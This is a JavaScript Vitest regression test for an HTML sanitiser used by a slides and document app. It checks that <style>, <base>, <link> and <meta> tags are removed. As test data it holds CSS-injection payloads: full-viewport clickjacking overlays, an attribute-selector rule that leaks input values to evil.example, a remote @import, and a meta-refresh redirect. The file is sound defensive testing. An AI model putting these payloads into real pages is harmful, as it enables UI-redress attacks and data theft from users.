/**
 * sanitizeStyleElement.test.js — THIRD-PASS (sec/office-triple) regression.
 * ----------------------------------------------------------------------------
 * A `<style>` ELEMENT was slipping through the rich/doc sanitiser. DOMPurify's
 * html profile keeps `<style>` and only weakly filters its CSS, so a hostile
 * `<style>` block carrying a full-viewport `position:fixed;inset:0` overlay
 * (clickjacking / UI-redress), an attribute-selector data-exfil rule, or an
 * `@import "https://evil/…"` survived verbatim. That output is rendered through
 * `dangerouslySetInnerHTML` on every slide surface (SlideCanvas / SlidePreview /
 * SlidesEditor / PresenterView) and written into the exported .html file — so a
 * hostile CRDT slide-object `html` or imported HTML could inject page-wide CSS
 * into the live app DOM.
 *
 * The inline `style` ATTRIBUTE is separately allow-listed (sanitizeStyleValue);
 * a `<style>` element bypassed that entirely. TipTap/Reveal never emit `<style>`,
 * so it (and base/link/meta) is now forbidden outright. These tests import the
 * REAL exported sanitisers (not a copied config) so a future config drift that
 * re-opens the hole fails here.
 */

import { describe, it, expect } from 'vitest'
import { sanitizeRichHtml, sanitizeSlideHtml, sanitizeDocHtml } from '../sanitize.js'

const SINKS = { sanitizeRichHtml, sanitizeSlideHtml, sanitizeDocHtml }

// A `<style>` after a leading element previously survived (DOMPurify parser
// quirk), so put a benign element first to reproduce the exact bypass shape.
const STYLE_PAYLOADS = {
  'viewport overlay (clickjacking)':
    '<p>x</p><style>*{position:fixed;top:0;left:0;width:100vw;height:100vh;background:red;z-index:99999}</style>',
  'attribute-selector data exfiltration':
    '<p>x</p><style>input[value^="a"]{background:url(https://evil.example/a)}</style>',
  '@import of remote CSS':
    '<p>x</p><style>@import "https://evil.example/x.css";</style>',
  'media-query wrapped overlay':
    '<p>x</p><style>@media all{*{position:fixed;inset:0;background:#000}}</style>',
  'style nested in a div':
    '<div><style>*{position:fixed;inset:0}</style></div><p>x</p>',
}

describe('sanitiser strips <style> elements (no CSS injection into innerHTML sinks)', () => {
  for (const [name, sanitize] of Object.entries(SINKS)) {
    describe(name, () => {
      for (const [label, payload] of Object.entries(STYLE_PAYLOADS)) {
        it(`removes the <style> element — ${label}`, () => {
          const out = sanitize(payload)
          expect(out.toLowerCase()).not.toContain('<style')
          // The CSS text must not survive either (no dumped declarations).
          expect(out).not.toContain('position:fixed')
          expect(out).not.toContain('@import')
          expect(out).not.toContain('evil.example')
          // Benign content is preserved.
          expect(out).toContain('x')
        })
      }

      it('forbids <base>/<link>/<meta> document-hijack tags', () => {
        const out = sanitize(
          '<base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css">' +
          '<meta http-equiv="refresh" content="0;url=https://evil.example"><p>keep</p>'
        )
        expect(out.toLowerCase()).not.toContain('<base')
        expect(out.toLowerCase()).not.toContain('<link')
        expect(out.toLowerCase()).not.toContain('<meta')
        expect(out).toContain('keep')
      })

      it('still preserves legitimate rich content (tables, inline style, lists, img)', () => {
        const out = sanitize(
          '<table><tbody><tr><td style="color:red;background:#fff">cell</td></tr></tbody></table>' +
          '<p style="text-align:center">c</p><ul><li>a</li></ul>' +
          '<img src="data:image/png;base64,AAAA" alt="">'
        )
        expect(out).toContain('<table>')
        expect(out).toContain('<td')
        expect(out).toContain('cell')
        expect(out).toContain('<li>a</li>')
      })
    })
  }
})
